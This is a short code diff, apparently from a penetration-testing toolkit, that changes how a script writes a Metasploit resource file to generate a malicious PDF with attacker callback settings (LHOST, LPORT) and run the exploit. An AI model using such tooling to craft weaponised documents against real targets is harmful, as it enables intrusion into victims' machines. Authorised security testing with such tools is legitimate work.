@@ -202,8 +202,10 @@ if exploit_counter == 0:
         if os.path.isfile(msfpath + "local/template.pdf"):
             os.remove(msfpath + "local/template.pdf")
 
+        if inputpdf != "": inputpdf = ("set INFILENAME " + inputpdf + "\n")
+        output = output.replace("//", "/")
         filewrite = open(setdir + "/template.rc", "w")
-        filewrite.write("use %s\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" %
+        filewrite.write("use %s\nset LHOST %s\nset LPORT %s\n%sset FILENAME %s\nexploit\n" %
                         (exploit, rhost, lport, inputpdf, output))
         filewrite.close()
         child = pexpect.spawn(
